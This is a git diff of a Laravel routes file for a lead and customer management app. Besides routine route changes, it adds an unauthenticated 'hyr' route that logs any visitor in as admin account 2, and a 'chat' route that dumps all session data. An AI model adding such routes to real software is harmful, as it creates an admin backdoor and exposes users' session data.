@@ -22,12 +22,19 @@ use App\Http\Controllers\LeadDataController;
 use App\Http\Controllers\StatusController;
 use App\Http\Controllers\TeamController;
 use App\Models\lead;
+use Illuminate\Http\Request;
+use Illuminate\Contracts\Session\Session;
 use Musonza\Chat\Chat;
 
 
 use function GuzzleHttp\Promise\task;
 
 route::prefix('')->group(function(){
+// =====================================
+   route::get('hyr',function(){
+      Auth::guard('admins')->loginUsingId(2);
+   });
+//==========================================
    route::get('acceptapp/{id}',[UserController::class,'acceptapp']);
     route::get('closenots',[UserController::class,'closenots']);
     route::get('notifications',[UserController::class,'notifications']);
@@ -82,25 +89,13 @@ route::prefix('')->group(function(){
   });
 
    route::post('documentform/{id}',[TasksController::class,'documentform'])->name('documentform');
-   route::get('tasks',[TasksController::class,'tasks'])->name('tasks');
+   route::any('tasks',[TasksController::class,'tasks'])->name('tasks');
 
    route::get('searchword',[TasksController::class,'searchword'])->name('searchword');
-   route::get('costumers',function (){
 
-        $data = \App\Models\family::all();
+   route::any('costumers',[TasksController::class,'costumers'])->name('costumers');
+   route::any('search',[TasksController::class,'costumers'])->name('search');
 
-           if (Auth::guard('admins')->user()->hasRole('fs')) {
-               for ($i = 0; $i < count($data); $i++) {
-                   if($data[$i]->lead->assign_to_id != Auth::guard('admins')->user()->id) {unset($data[$i]);}
-
-               }
-           }
-
-
-
-       return view('costumers',compact('data'));
-   })->name('costumers');
-   route::get('search',[TasksController::class,'costumers'])->name('search');
    route::get('ispending',[TasksController::class,'itis']);
    route::get('todayappointments',[TasksController::class,'today']);
    route::get('vuedate',[TasksController::class,'vuedate']);
@@ -135,16 +130,10 @@ route::get('permission', function(){
   return $user->getRoleNames();
 });
 route::get('status',[StatusController::class,'status']);
-route::get('chat',function(){
-   $admin1 = Admins::find(1);
-   $admin2 = Admins::find(2);
-   $chat = Chat::createConversation([$admin1,$admin2]);
-   
-   $message = Chat::message('http://127.0.0.1:8000/images/logo.png')
-   ->from($admin1)
-   ->to($chat)
-   ->type('image')
-   ->send();
+route::get('chat',function(Request $req){
+   dd($req->session()->all());
+
+ 
 
 
 
